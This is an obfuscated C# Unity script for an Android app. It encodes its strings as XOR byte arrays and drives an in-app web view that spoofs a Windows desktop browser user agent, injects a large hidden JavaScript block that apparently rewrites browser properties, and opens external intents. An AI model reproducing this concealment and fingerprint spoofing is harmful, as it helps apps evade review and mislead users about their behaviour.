using AndroidInstallReferrer;
using DG.Tweening;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using Unity.Notifications.Android;
using Unity.Services.Authentication;
using Unity.Services.CloudSave;
using Unity.Services.CloudSave.Models;
using Unity.Services.CloudSave.Models.Data.Player;
using Unity.Services.Core;
using Unity.Services.PushNotifications;
using UnityEngine;
using UnityEngine.Android;
using UnityEngine.InputSystem;
using UnityEngine.InputSystem.EnhancedTouch;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;
using UnityEngine.UI;
using Application = UnityEngine.Application;

public class _0xde141cf2 : MonoBehaviour
{
    private string _0xf1265ea3 = "";
    private static readonly string WindowsDesktopUserAgent = _0x9fe415a8._0x073f6504(new byte[111] { 235, 201, 220, 207, 202, 202, 199, 137, 147, 136, 150, 134, 142, 241, 207, 200, 194, 201, 209, 213, 134, 232, 242, 134, 151, 150, 136, 150, 157, 134, 241, 207, 200, 144, 146, 157, 134, 222, 144, 146, 143, 134, 231, 214, 214, 202, 195, 241, 195, 196, 237, 207, 210, 137, 147, 149, 145, 136, 149, 144, 134, 142, 237, 238, 242, 235, 234, 138, 134, 202, 207, 205, 195, 134, 225, 195, 197, 205, 201, 143, 134, 229, 206, 212, 201, 203, 195, 137, 151, 148, 150, 136, 150, 136, 150, 136, 150, 134, 245, 199, 192, 199, 212, 207, 137, 147, 149, 145, 136, 149, 144 }, 166);
    private string _0xfac7fe89()
    {
        try
        {
            using (var _0x5fd8b074 = new AndroidJavaClass(_0x9fe415a8._0x073f6504(new byte[30] { 135, 139, 137, 202, 145, 138, 141, 144, 157, 215, 128, 202, 148, 136, 133, 157, 129, 150, 202, 177, 138, 141, 144, 157, 180, 136, 133, 157, 129, 150 }, 228)))
            {
                var _0xa7d6abcd = _0x5fd8b074.GetStatic<AndroidJavaObject>(_0x9fe415a8._0x073f6504(new byte[15] { 42, 60, 59, 59, 44, 39, 61, 8, 42, 61, 32, 63, 32, 61, 48 }, 73));
                var _0x9e671b87 = _0xa7d6abcd.Call<AndroidJavaObject>(_0x9fe415a8._0x073f6504(new byte[21] { 139, 137, 152, 173, 156, 156, 128, 133, 143, 141, 152, 133, 131, 130, 175, 131, 130, 152, 137, 148, 152 }, 236));
                using (var _0xa95a8e02 = new AndroidJavaClass(_0x9fe415a8._0x073f6504(new byte[26] { 205, 194, 200, 222, 195, 197, 200, 130, 219, 201, 206, 199, 197, 216, 130, 251, 201, 206, 255, 201, 216, 216, 197, 194, 203, 223 }, 172)))
                {
                    return _0xa95a8e02.CallStatic<string>(_0x9fe415a8._0x073f6504(new byte[19] { 137, 139, 154, 170, 139, 136, 143, 155, 130, 154, 187, 157, 139, 156, 175, 137, 139, 128, 154 }, 238), _0x9e671b87);
                }
            }
        }
        catch
        {
            return "";
        }
    }

    private bool _0x8b9f28a6 = false;
    private async Task<bool> _0x72eedaa5()
    {
        {
#if B_LOGS
            Debug.Log(_0x9fe415a8._0x073f6504(new byte[29] { 178, 189, 140, 154, 157, 180, 201, 160, 154, 185, 155, 128, 159, 136, 138, 144, 168, 135, 141, 186, 136, 159, 140, 141, 170, 129, 140, 138, 130 }, 233));
#endif
        }

        string _0x8dc9c8d3 = "";
        for (int _0x215ac23a = 0; _0x215ac23a < 2; _0x215ac23a++)
        {
            if (await _0x8a5eacf1(1, 100))
            {
                await _0x088b9e09(_0x9fe415a8._0x073f6504(new byte[7] { 121, 119, 116, 120, 112, 126, 127 }, 27));
                _0x1b8962c6();
                return true;
            }

            _0x8dc9c8d3 = await _0xe2f068f3(1, 100);
            if (!string.IsNullOrEmpty(_0x8dc9c8d3))
                break;
        }

        try
        {
            if (!string.IsNullOrEmpty(_0x8dc9c8d3))
            {
                if (!string.IsNullOrEmpty(_0x10902a44))
                {
                    _0x8dc9c8d3 = _0xbcfcc0e5(_0x8dc9c8d3, _0x10902a44);
                    {
#if B_LOGS
                        Debug.Log(_0x9fe415a8._0x073f6504(new byte[53] { 119, 120, 73, 95, 88, 113, 12, 111, 77, 79, 68, 73, 72, 12, 74, 69, 66, 77, 64, 121, 94, 64, 12, 91, 69, 88, 68, 12, 95, 73, 66, 72, 69, 72, 12, 206, 170, 190, 12, 95, 68, 67, 91, 12, 123, 73, 78, 122, 69, 73, 91, 22, 12 }, 44) + _0x8dc9c8d3);
#endif
                    }
                }
                else
                {
                    {
#if B_LOGS
                        Debug.Log(_0x9fe415a8._0x073f6504(new byte[39] { 0, 15, 62, 40, 47, 6, 123, 24, 58, 56, 51, 62, 63, 123, 61, 50, 53, 58, 55, 14, 41, 55, 123, 185, 221, 201, 123, 40, 51, 52, 44, 123, 12, 62, 57, 13, 50, 62, 44 }, 91));
#endif
                    }
                }

                _0x62731cad = true;
                _0x2c3857f1(_0x8dc9c8d3);
                return true;
            }

            return false;
        }
        catch (Exception e)
        {
            {
#if B_LOGS
                {
                    Debug.Log(_0x9fe415a8._0x073f6504(new byte[44] { 223, 208, 225, 247, 240, 217, 164, 193, 252, 231, 225, 244, 240, 237, 235, 234, 164, 243, 236, 237, 232, 225, 164, 231, 236, 225, 231, 239, 237, 234, 227, 164, 247, 229, 242, 225, 224, 164, 232, 237, 234, 239, 190, 164 }, 132) + e.Message);
                }
#endif
            }

            return true;
        }
    }

    private bool _0xd1fc92ce(string _0xebf6b755)
    {
        if (string.IsNullOrEmpty(_0xebf6b755))
            return false;
        try
        {
            using (var _0xf0e4221a = new AndroidJavaClass(_0x9fe415a8._0x073f6504(new byte[30] { 127, 115, 113, 50, 105, 114, 117, 104, 101, 47, 120, 50, 108, 112, 125, 101, 121, 110, 50, 73, 114, 117, 104, 101, 76, 112, 125, 101, 121, 110 }, 28)))
            using (var _0x1583cb9b = _0xf0e4221a.GetStatic<AndroidJavaObject>(_0x9fe415a8._0x073f6504(new byte[15] { 201, 223, 216, 216, 207, 196, 222, 235, 201, 222, 195, 220, 195, 222, 211 }, 170)))
            using (var _0xa545ac07 = _0x1583cb9b.Call<AndroidJavaObject>(_0x9fe415a8._0x073f6504(new byte[17] { 198, 196, 213, 241, 192, 194, 202, 192, 198, 196, 236, 192, 207, 192, 198, 196, 211 }, 161)))
            using (var _0x61c935df = _0xa545ac07.Call<AndroidJavaObject>(_0x9fe415a8._0x073f6504(new byte[25] { 15, 13, 28, 36, 9, 29, 6, 11, 0, 33, 6, 28, 13, 6, 28, 46, 7, 26, 56, 9, 11, 3, 9, 15, 13 }, 104), _0xebf6b755))
            {
                if (_0x61c935df == null)
                    return false;
                WLog(_0x9fe415a8._0x073f6504(new byte[37] { 11, 32, 58, 39, 37, 45, 4, 33, 35, 45, 104, 36, 41, 61, 38, 43, 32, 104, 33, 38, 59, 60, 41, 36, 36, 45, 44, 104, 56, 41, 43, 35, 41, 47, 45, 114, 104 }, 72) + _0xebf6b755);
                _0x61c935df.Call<AndroidJavaObject>(_0x9fe415a8._0x073f6504(new byte[8] { 188, 185, 185, 155, 177, 188, 186, 174 }, 221), 0x10000000);
                _0x1583cb9b.Call(_0x9fe415a8._0x073f6504(new byte[13] { 248, 255, 234, 249, 255, 202, 232, 255, 226, 253, 226, 255, 242 }, 139), _0x61c935df);
                return true;
            }
        }
        catch
        {
            return false;
        }
    }

    private bool _0x6705c753(string _0x7de522a7)
    {
        try
        {
            using (var _0xc6ce37ee = new AndroidJavaClass(_0x9fe415a8._0x073f6504(new byte[30] { 92, 80, 82, 17, 74, 81, 86, 75, 70, 12, 91, 17, 79, 83, 94, 70, 90, 77, 17, 106, 81, 86, 75, 70, 111, 83, 94, 70, 90, 77 }, 63)))
            using (var _0x5743939e = _0xc6ce37ee.GetStatic<AndroidJavaObject>(_0x9fe415a8._0x073f6504(new byte[15] { 75, 93, 90, 90, 77, 70, 92, 105, 75, 92, 65, 94, 65, 92, 81 }, 40)))
            using (var _0x44f6be51 = _0x5743939e.Call<AndroidJavaObject>(_0x9fe415a8._0x073f6504(new byte[17] { 126, 124, 109, 73, 120, 122, 114, 120, 126, 124, 84, 120, 119, 120, 126, 124, 107 }, 25)))
            using (var _0x19e9fc74 = new AndroidJavaClass(_0x9fe415a8._0x073f6504(new byte[22] { 197, 202, 192, 214, 203, 205, 192, 138, 199, 203, 202, 208, 193, 202, 208, 138, 237, 202, 208, 193, 202, 208 }, 164)))
            using (var _0x281905b9 = _0x19e9fc74.CallStatic<AndroidJavaObject>(_0x9fe415a8._0x073f6504(new byte[8] { 167, 182, 165, 164, 178, 130, 165, 190 }, 215), _0x7de522a7, 1))
            {
                string _0x4cafcb3d = _0x281905b9.Call<string>(_0x9fe415a8._0x073f6504(new byte[14] { 82, 80, 65, 102, 65, 71, 92, 91, 82, 112, 77, 65, 71, 84 }, 53), _0x9fe415a8._0x073f6504(new byte[20] { 201, 217, 196, 220, 216, 206, 217, 244, 205, 202, 199, 199, 201, 202, 200, 192, 244, 222, 217, 199 }, 171));
                string _0xdaa8ce68 = _0x281905b9.Call<string>(_0x9fe415a8._0x073f6504(new byte[10] { 36, 38, 55, 19, 34, 32, 40, 34, 36, 38 }, 67));
                _0x281905b9.Call<AndroidJavaObject>(_0x9fe415a8._0x073f6504(new byte[11] { 155, 158, 158, 185, 155, 142, 159, 157, 149, 136, 131 }, 250), _0x9fe415a8._0x073f6504(new byte[33] { 62, 49, 59, 45, 48, 54, 59, 113, 54, 49, 43, 58, 49, 43, 113, 60, 62, 43, 58, 56, 48, 45, 38, 113, 29, 13, 16, 8, 12, 30, 29, 19, 26 }, 95));
                _0x281905b9.Call<AndroidJavaObject>(_0x9fe415a8._0x073f6504(new byte[11] { 194, 213, 221, 223, 198, 213, 245, 200, 196, 194, 209 }, 176), _0x9fe415a8._0x073f6504(new byte[20] { 42, 58, 39, 63, 59, 45, 58, 23, 46, 41, 36, 36, 42, 41, 43, 35, 23, 61, 58, 36 }, 72));
                if (_0x281905b9.Call<AndroidJavaObject>(_0x9fe415a8._0x073f6504(new byte[15] { 15, 24, 14, 18, 17, 11, 24, 60, 30, 9, 20, 11, 20, 9, 4 }, 125), _0x44f6be51) != null)
                {
                    WLog(_0x9fe415a8._0x073f6504(new byte[24] { 157, 182, 172, 177, 179, 187, 146, 183, 181, 187, 254, 177, 174, 187, 176, 254, 183, 176, 170, 187, 176, 170, 228, 254 }, 222) + _0x7de522a7);
                    _0x281905b9.Call<AndroidJavaObject>(_0x9fe415a8._0x073f6504(new byte[8] { 168, 173, 173, 143, 165, 168, 174, 186 }, 201), 0x10000000);
                    _0x5743939e.Call(_0x9fe415a8._0x073f6504(new byte[13] { 186, 189, 168, 187, 189, 136, 170, 189, 160, 191, 160, 189, 176 }, 201), _0x281905b9);
                    return true;
                }

                if (_0xd1fc92ce(_0xdaa8ce68))
                    return true;
                if (!string.IsNullOrEmpty(_0x4cafcb3d))
                {
                    WLog(_0x9fe415a8._0x073f6504(new byte[28] { 227, 200, 210, 207, 205, 197, 236, 201, 203, 197, 128, 201, 206, 212, 197, 206, 212, 128, 198, 193, 204, 204, 194, 193, 195, 203, 154, 128 }, 160) + _0x4cafcb3d);
                    if (_0x5e2761c8(_0x4cafcb3d))
                        return _0xb4633e82(_0x4cafcb3d, _0xdaa8ce68);
                    return _0x7ef3d485(_0x4cafcb3d);
                }

                WLog(_0x9fe415a8._0x073f6504(new byte[30] { 54, 29, 7, 26, 24, 16, 57, 28, 30, 16, 85, 28, 27, 1, 16, 27, 1, 85, 27, 26, 85, 29, 20, 27, 17, 25, 16, 7, 79, 85 }, 117) + _0x7de522a7);
                return true;
            }
        }
        catch (Exception e)
        {
            WLog(_0x9fe415a8._0x073f6504(new byte[26] { 193, 234, 240, 237, 239, 231, 206, 235, 233, 231, 162, 235, 236, 246, 231, 236, 246, 162, 228, 227, 235, 238, 231, 230, 184, 162 }, 130) + e.Message);
            return true;
        }
    }

    private string _0x12689d93()
    {
        return _0x9fe415a8._0x073f6504(new byte[12] { 150, 216, 203, 208, 221, 202, 215, 209, 208, 150, 151, 197 }, 190) + _0x9fe415a8._0x073f6504(new byte[8] { 58, 45, 62, 108, 57, 45, 113, 107 }, 76) + WindowsDesktopUserAgent + _0x9fe415a8._0x073f6504(new byte[2] { 46, 50 }, 9) + _0x9fe415a8._0x073f6504(new byte[30] { 25, 14, 29, 79, 31, 29, 0, 27, 0, 82, 33, 14, 25, 6, 8, 14, 27, 0, 29, 65, 31, 29, 0, 27, 0, 27, 22, 31, 10, 84 }, 111) + _0x9fe415a8._0x073f6504(new byte[121] { 113, 98, 121, 116, 99, 126, 120, 121, 55, 115, 114, 113, 63, 120, 117, 125, 59, 124, 114, 110, 59, 97, 118, 123, 62, 108, 99, 101, 110, 108, 88, 117, 125, 114, 116, 99, 57, 115, 114, 113, 126, 121, 114, 71, 101, 120, 103, 114, 101, 99, 110, 63, 120, 117, 125, 59, 124, 114, 110, 59, 108, 112, 114, 99, 45, 113, 98, 121, 116, 99, 126, 120, 121, 63, 62, 108, 101, 114, 99, 98, 101, 121, 55, 97, 118, 123, 44, 106, 59, 116, 120, 121, 113, 126, 112, 98, 101, 118, 117, 123, 114, 45, 99, 101, 98, 114, 106, 62, 44, 106, 116, 118, 99, 116, 127, 63, 114, 62, 108, 106, 106 }, 23) + _0x9fe415a8._0x073f6504(new byte[26] { 27, 26, 25, 87, 15, 13, 16, 11, 16, 83, 88, 10, 12, 26, 13, 62, 24, 26, 17, 11, 88, 83, 10, 30, 86, 68 }, 127) + _0x9fe415a8._0x073f6504(new byte[130] { 65, 64, 67, 13, 85, 87, 74, 81, 74, 9, 2, 68, 85, 85, 115, 64, 87, 86, 76, 74, 75, 2, 9, 2, 16, 11, 21, 5, 13, 114, 76, 75, 65, 74, 82, 86, 5, 107, 113, 5, 20, 21, 11, 21, 30, 5, 114, 76, 75, 19, 17, 30, 5, 93, 19, 17, 12, 5, 100, 85, 85, 73, 64, 114, 64, 71, 110, 76, 81, 10, 16, 22, 18, 11, 22, 19, 5, 13, 110, 109, 113, 104, 105, 9, 5, 73, 76, 78, 64, 5, 98, 64, 70, 78, 74, 12, 5, 102, 77, 87, 74, 72, 64, 10, 20, 23, 21, 11, 21, 11, 21, 11, 21, 5, 118, 68, 67, 68, 87, 76, 10, 16, 22, 18, 11, 22, 19, 2, 12, 30 }, 37) + _0x9fe415a8._0x073f6504(new byte[30] { 84, 85, 86, 24, 64, 66, 95, 68, 95, 28, 23, 64, 92, 81, 68, 86, 95, 66, 93, 23, 28, 23, 103, 89, 94, 3, 2, 23, 25, 11 }, 48) + _0x9fe415a8._0x073f6504(new byte[34] { 137, 136, 139, 197, 157, 159, 130, 153, 130, 193, 202, 155, 136, 131, 137, 130, 159, 202, 193, 202, 170, 130, 130, 138, 129, 136, 205, 164, 131, 142, 195, 202, 196, 214 }, 237) + _0x9fe415a8._0x073f6504(new byte[30] { 83, 82, 81, 31, 71, 69, 88, 67, 88, 27, 16, 90, 86, 79, 99, 88, 66, 84, 95, 103, 88, 94, 89, 67, 68, 16, 27, 7, 30, 12 }, 55) + _0x9fe415a8._0x073f6504(new byte[449] { 203, 205, 198, 196, 201, 222, 205, 159, 202, 222, 219, 130, 196, 221, 205, 222, 209, 219, 204, 133, 228, 196, 221, 205, 222, 209, 219, 133, 152, 252, 215, 205, 208, 210, 214, 202, 210, 152, 147, 201, 218, 205, 204, 214, 208, 209, 133, 152, 142, 141, 143, 152, 194, 147, 196, 221, 205, 222, 209, 219, 133, 152, 248, 208, 208, 216, 211, 218, 159, 252, 215, 205, 208, 210, 218, 152, 147, 201, 218, 205, 204, 214, 208, 209, 133, 152, 142, 141, 143, 152, 194, 147, 196, 221, 205, 222, 209, 219, 133, 152, 241, 208, 203, 130, 254, 128, 253, 205, 222, 209, 219, 152, 147, 201, 218, 205, 204, 214, 208, 209, 133, 152, 141, 139, 152, 194, 226, 147, 210, 208, 221, 214, 211, 218, 133, 217, 222, 211, 204, 218, 147, 207, 211, 222, 203, 217, 208, 205, 210, 133, 152, 232, 214, 209, 219, 208, 200, 204, 152, 147, 216, 218, 203, 247, 214, 216, 215, 250, 209, 203, 205, 208, 207, 198, 233, 222, 211, 202, 218, 204, 133, 217, 202, 209, 220, 203, 214, 208, 209, 151, 150, 196, 205, 218, 203, 202, 205, 209, 159, 239, 205, 208, 210, 214, 204, 218, 145, 205, 218, 204, 208, 211, 201, 218, 151, 196, 222, 205, 220, 215, 214, 203, 218, 220, 203, 202, 205, 218, 133, 152, 199, 135, 137, 152, 147, 221, 214, 203, 209, 218, 204, 204, 133, 152, 137, 139, 152, 147, 210, 208, 221, 214, 211, 218, 133, 217, 222, 211, 204, 218, 147, 210, 208, 219, 218, 211, 133, 152, 152, 147, 207, 211, 222, 203, 217, 208, 205, 210, 133, 152, 232, 214, 209, 219, 208, 200, 204, 152, 147, 207, 211, 222, 203, 217, 208, 205, 210, 233, 218, 205, 204, 214, 208, 209, 133, 152, 142, 138, 145, 143, 145, 143, 152, 147, 202, 222, 249, 202, 211, 211, 233, 218, 205, 204, 214, 208, 209, 133, 152, 142, 141, 143, 145, 143, 145, 143, 145, 143, 152, 194, 150, 132, 194, 194, 132, 240, 221, 213, 218, 220, 203, 145, 219, 218, 217, 214, 209, 218, 239, 205, 208, 207, 218, 205, 203, 198, 151, 207, 205, 208, 203, 208, 147, 152, 202, 204, 218, 205, 254, 216, 218, 209, 203, 251, 222, 203, 222, 152, 147, 196, 216, 218, 203, 133, 217, 202, 209, 220, 203, 214, 208, 209, 151, 150, 196, 205, 218, 203, 202, 205, 209, 159, 202, 222, 219, 132, 194, 147, 220, 208, 209, 217, 214, 216, 202, 205, 222, 221, 211, 218, 133, 203, 205, 202, 218, 194, 150, 132, 194, 220, 222, 203, 220, 215, 151, 218, 150, 196, 194 }, 191) + _0x9fe415a8._0x073f6504(new byte[112] { 20, 21, 22, 88, 3, 19, 2, 21, 21, 30, 92, 87, 7, 25, 20, 4, 24, 87, 92, 65, 73, 66, 64, 89, 75, 20, 21, 22, 88, 3, 19, 2, 21, 21, 30, 92, 87, 24, 21, 25, 23, 24, 4, 87, 92, 65, 64, 72, 64, 89, 75, 20, 21, 22, 88, 3, 19, 2, 21, 21, 30, 92, 87, 17, 6, 17, 25, 28, 39, 25, 20, 4, 24, 87, 92, 65, 73, 66, 64, 89, 75, 20, 21, 22, 88, 3, 19, 2, 21, 21, 30, 92, 87, 17, 6, 17, 25, 28, 56, 21, 25, 23, 24, 4, 87, 92, 65, 64, 68, 64, 89, 75 }, 112) + _0x9fe415a8._0x073f6504(new byte[45] { 32, 38, 45, 47, 35, 61, 58, 48, 59, 35, 122, 59, 58, 32, 59, 33, 55, 60, 39, 32, 53, 38, 32, 105, 33, 58, 48, 49, 50, 61, 58, 49, 48, 111, 41, 55, 53, 32, 55, 60, 124, 49, 125, 47, 41 }, 84) + _0x9fe415a8._0x073f6504(new byte[721] { 7, 1, 10, 8, 5, 18, 1, 83, 28, 1, 26, 20, 78, 4, 26, 29, 23, 28, 4, 93, 30, 18, 7, 16, 27, 62, 22, 23, 26, 18, 93, 17, 26, 29, 23, 91, 4, 26, 29, 23, 28, 4, 90, 72, 4, 26, 29, 23, 28, 4, 93, 30, 18, 7, 16, 27, 62, 22, 23, 26, 18, 78, 21, 6, 29, 16, 7, 26, 28, 29, 91, 2, 90, 8, 5, 18, 1, 83, 0, 78, 32, 7, 1, 26, 29, 20, 91, 2, 90, 93, 7, 28, 63, 28, 4, 22, 1, 48, 18, 0, 22, 91, 90, 72, 26, 21, 91, 0, 93, 26, 29, 23, 22, 11, 60, 21, 91, 84, 3, 28, 26, 29, 7, 22, 1, 73, 83, 16, 28, 18, 1, 0, 22, 84, 90, 77, 78, 67, 15, 15, 0, 93, 26, 29, 23, 22, 11, 60, 21, 91, 84, 27, 28, 5, 22, 1, 73, 83, 29, 28, 29, 22, 84, 90, 77, 78, 67, 15, 15, 0, 93, 26, 29, 23, 22, 11, 60, 21, 91, 84, 30, 18, 11, 94, 4, 26, 23, 7, 27, 84, 90, 77, 78, 67, 15, 15, 0, 93, 26, 29, 23, 22, 11, 60, 21, 91, 84, 30, 18, 11, 94, 23, 22, 5, 26, 16, 22, 94, 4, 26, 23, 7, 27, 84, 90, 77, 78, 67, 90, 1, 22, 7, 6, 1, 29, 83, 8, 30, 18, 7, 16, 27, 22, 0, 73, 21, 18, 31, 0, 22, 95, 30, 22, 23, 26, 18, 73, 2, 95, 28, 29, 16, 27, 18, 29, 20, 22, 73, 29, 6, 31, 31, 95, 18, 23, 23, 63, 26, 0, 7, 22, 29, 22, 1, 73, 21, 6, 29, 16, 7, 26, 28, 29, 91, 90, 8, 14, 95, 1, 22, 30, 28, 5, 22, 63, 26, 0, 7, 22, 29, 22, 1, 73, 21, 6, 29, 16, 7, 26, 28, 29, 91, 90, 8, 14, 95, 18, 23, 23, 54, 5, 22, 29, 7, 63, 26, 0, 7, 22, 29, 22, 1, 73, 21, 6, 29, 16, 7, 26, 28, 29, 91, 90, 8, 14, 95, 1, 22, 30, 28, 5, 22, 54, 5, 22, 29, 7, 63, 26, 0, 7, 22, 29, 22, 1, 73, 21, 6, 29, 16, 7, 26, 28, 29, 91, 90, 8, 14, 95, 23, 26, 0, 3, 18, 7, 16, 27, 54, 5, 22, 29, 7, 73, 21, 6, 29, 16, 7, 26, 28, 29, 91, 90, 8, 1, 22, 7, 6, 1, 29, 83, 21, 18, 31, 0, 22, 72, 14, 14, 72, 26, 21, 91, 0, 93, 26, 29, 23, 22, 11, 60, 21, 91, 84, 3, 28, 26, 29, 7, 22, 1, 73, 83, 21, 26, 29, 22, 84, 90, 77, 78, 67, 15, 15, 0, 93, 26, 29, 23, 22, 11, 60, 21, 91, 84, 27, 28, 5, 22, 1, 73, 83, 27, 28, 5, 22, 1, 84, 90, 77, 78, 67, 90, 1, 22, 7, 6, 1, 29, 83, 8, 30, 18, 7, 16, 27, 22, 0, 73, 7, 1, 6, 22, 95, 30, 22, 23, 26, 18, 73, 2, 95, 28, 29, 16, 27, 18, 29, 20, 22, 73, 29, 6, 31, 31, 95, 18, 23, 23, 63, 26, 0, 7, 22, 29, 22, 1, 73, 21, 6, 29, 16, 7, 26, 28, 29, 91, 90, 8, 14, 95, 1, 22, 30, 28, 5, 22, 63, 26, 0, 7, 22, 29, 22, 1, 73, 21, 6, 29, 16, 7, 26, 28, 29, 91, 90, 8, 14, 95, 18, 23, 23, 54, 5, 22, 29, 7, 63, 26, 0, 7, 22, 29, 22, 1, 73, 21, 6, 29, 16, 7, 26, 28, 29, 91, 90, 8, 14, 95, 1, 22, 30, 28, 5, 22, 54, 5, 22, 29, 7, 63, 26, 0, 7, 22, 29, 22, 1, 73, 21, 6, 29, 16, 7, 26, 28, 29, 91, 90, 8, 14, 95, 23, 26, 0, 3, 18, 7, 16, 27, 54, 5, 22, 29, 7, 73, 21, 6, 29, 16, 7, 26, 28, 29, 91, 90, 8, 1, 22, 7, 6, 1, 29, 83, 21, 18, 31, 0, 22, 72, 14, 14, 72, 1, 22, 7, 6, 1, 29, 83, 28, 1, 26, 20, 91, 2, 90, 72, 14, 72, 14, 16, 18, 7, 16, 27, 91, 22, 90, 8, 14 }, 115) + _0x9fe415a8._0x073f6504(new byte[5] { 70, 18, 19, 18, 0 }, 59);
    }

    private string GetFailingUrl(UniWebViewNativeResultPayload _0x51624067)
    {
        if (_0x51624067 == null || _0x51624067.Extra == null)
            return null;
        object _0xd59b795e;
        if (!_0x51624067.Extra.TryGetValue(UniWebViewNativeResultPayload.ExtraFailingURLKey, out _0xd59b795e))
            return null;
        return _0xd59b795e as string;
    }

    private void _0x6add8617()
    {
        if (_0xb20597eb)
        {
            WLog(_0x9fe415a8._0x073f6504(new byte[18] { 52, 9, 24, 5, 81, 16, 29, 3, 20, 16, 21, 8, 81, 2, 25, 30, 6, 31 }, 113));
            return;
        }

        _0x1142ece4(false);
        WLog(_0x9fe415a8._0x073f6504(new byte[46] { 15, 35, 43, 44, 98, 21, 39, 32, 20, 43, 39, 53, 98, 18, 55, 49, 42, 98, 12, 45, 54, 43, 36, 43, 33, 35, 54, 43, 45, 44, 98, 106, 42, 35, 48, 38, 53, 35, 48, 39, 98, 32, 35, 33, 41, 107 }, 66));
        ++_0xa3b62801;
        _0x4a7ac11e();
        if (_0xa3b62801 <= 1)
            return;
        if (_0x77edac20())
        {
            WLog(_0x9fe415a8._0x073f6504(new byte[37] { 207, 242, 227, 254, 170, 249, 225, 227, 250, 250, 239, 238, 170, 167, 180, 170, 250, 229, 250, 255, 250, 249, 170, 249, 254, 227, 230, 230, 170, 229, 250, 239, 228, 239, 238, 176, 170 }, 138) + _0x754a2946.Count);
            return;
        }

        Application.Quit();
    }

    private GameObject _0x9b2fb3b8;
    private string _0x64712a8c = "";
    private void _0x49acc03a()
    {
        WLog(_0x9fe415a8._0x073f6504(new byte[21] { 74, 99, 112, 102, 117, 99, 112, 103, 34, 96, 99, 97, 105, 34, 114, 112, 103, 113, 113, 103, 102 }, 2));
        if (Time.frameCount == _0xdc66f729)
            return;
        _0xdc66f729 = Time.frameCount;
        if (_0x3906a473())
            return;
        _0x6add8617();
    }

    internal Vector2 lastSize = Vector2.zero;
    private string _0x31a75f61 = "";
    private JObject _0xf3b9e3cf(params string[] _0xeea360f5)
    {
        JObject _0x4b82e82e = new JObject();
        foreach (var _0x2c74a8e2 in _0xeea360f5)
        {
            string _0xf5818212 = _0xac17573a();
            {
#if B_LOGS
                Debug.Log($"[Test] Crypto key={_0xf5818212} val={_0x2c74a8e2}");
#endif
            }

            _0x4b82e82e.Add(_0xf5818212, _0x2c74a8e2 == null ? "" : _0x2c74a8e2);
        }

        return _0x4b82e82e;
    }

    private bool _0x3906a473()
    {
        if (_0x57710795())
            return true;
        if (_0x00eaf601 != null && _0x00eaf601.CanGoBack)
        {
            WLog(_0x9fe415a8._0x073f6504(new byte[36] { 70, 111, 124, 106, 121, 111, 124, 107, 46, 108, 111, 109, 101, 46, 35, 48, 46, 99, 111, 103, 96, 46, 89, 107, 108, 88, 103, 107, 121, 46, 73, 97, 76, 111, 109, 101 }, 14));
            _0x00eaf601.GoBack();
            return true;
        }

        return false;
    }

    // WEB VIEW LOGIC
    public bool _0x9c09cacf { get; set; }

    private string _0x4ff87218 = "";
    private Text _0x97455ce0;
    internal Button _0x091b0f2a(string _0xcd86b52f, Transform _0xe214ff4a)
    {
        var _0x9a59380a = new GameObject(_0xcd86b52f + _0x9fe415a8._0x073f6504(new byte[3] { 87, 97, 123 }, 21), typeof(RectTransform), typeof(Image), typeof(Button));
        var _0x4b2c406c = _0x9a59380a.GetComponent<RectTransform>();
        _0x4b2c406c.SetParent(_0xe214ff4a, false);
        var _0x93f8e122 = _0x9a59380a.GetComponent<Image>();
        _0x93f8e122.color = new Color(0.92f, 0.92f, 0.95f, 1f);
        var _0xd675eedb = _0x9a59380a.GetComponent<Button>();
        var _0xd1cf321e = _0xd675eedb.colors;
        _0xd1cf321e.highlightedColor = new Color(0.85f, 0.85f, 0.9f);
        _0xd1cf321e.pressedColor = new Color(0.8f, 0.8f, 0.88f);
        _0xd675eedb.colors = _0xd1cf321e;
        var _0x87b9cf57 = new GameObject(_0x9fe415a8._0x073f6504(new byte[4] { 21, 36, 57, 53 }, 65), typeof(RectTransform), typeof(Text));
        var _0x5f459662 = _0x87b9cf57.GetComponent<RectTransform>();
        _0x5f459662.SetParent(_0x9a59380a.transform, false);
        _0x5f459662.anchorMin = Vector2.zero;
        _0x5f459662.anchorMax = Vector2.one;
        _0x5f459662.offsetMin = _0x5f459662.offsetMax = Vector2.zero;
        var _0x1c56b470 = _0x87b9cf57.GetComponent<Text>();
        _0x1c56b470.text = _0xcd86b52f;
        _0x1c56b470.alignment = TextAnchor.MiddleCenter;
        _0x1c56b470.color = Color.black;
        _0x1c56b470.font = Resources.GetBuiltinResource<Font>(_0x9fe415a8._0x073f6504(new byte[9] { 40, 27, 0, 8, 5, 71, 29, 29, 15 }, 105));
        _0x1c56b470.fontSize = 28;
        WLog(_0x9fe415a8._0x073f6504(new byte[14] { 176, 129, 150, 146, 135, 150, 177, 134, 135, 135, 156, 157, 211, 212 }, 243) + _0xcd86b52f + _0x9fe415a8._0x073f6504(new byte[1] { 173 }, 138));
        return _0xd675eedb;
    }

    internal void Update()
    {
        if (_0x00eaf601 == null)
            return;
        if (_0xa44367de())
            _0x49acc03a();
        if (!isApplicationFocus || isApplicationPause)
            return;
        _0xe0cafdb9();
        if (_0x8b9f28a6 && _0xbb1dcbc3 != null)
            _0xbb1dcbc3.Rotate(0f, 0f, -360f * Time.deltaTime);
    }

    private string _0x10902a44;
    private void _0xa8b8a8f3(UniWebView _0xeda70641)
    {
        _0xeda70641.BackgroundColor = Color.clear;
        _0xeda70641.SetSupportMultipleWindows(true, true);
        _0xeda70641.SetBackButtonEnabled(false);
        _0x00eaf601.SetUserAgent(_0xad706657());
    }

    private readonly List<UniWebViewPopup> _0x754a2946 = new List<UniWebViewPopup>();
    private static bool IsPrivacyItemTrue(Item _0x47b339b3)
    {
        if (_0x47b339b3.Key != _0x9fe415a8._0x073f6504(new byte[9] { 0, 26, 57, 27, 0, 31, 8, 10, 16 }, 105))
            return false;
        try
        {
            var _0xf2b2672e = _0x47b339b3.Value.GetAs<object>();
            return _0xf2b2672e switch
            {
                bool b => b,
                string s when bool.TryParse(s, out var parsed) => parsed,
                _ => false
            };
        }
        catch
        {
            return false;
        }
    }

    private void _0xb925bf25(string _0xaf9e788a)
    {
        Dictionary<string, object> _0x19fc2b2f;
        try
        {
            _0x19fc2b2f = JsonConvert.DeserializeObject<Dictionary<string, object>>(_0xaf9e788a);
        }
        catch
        {
            return;
        }

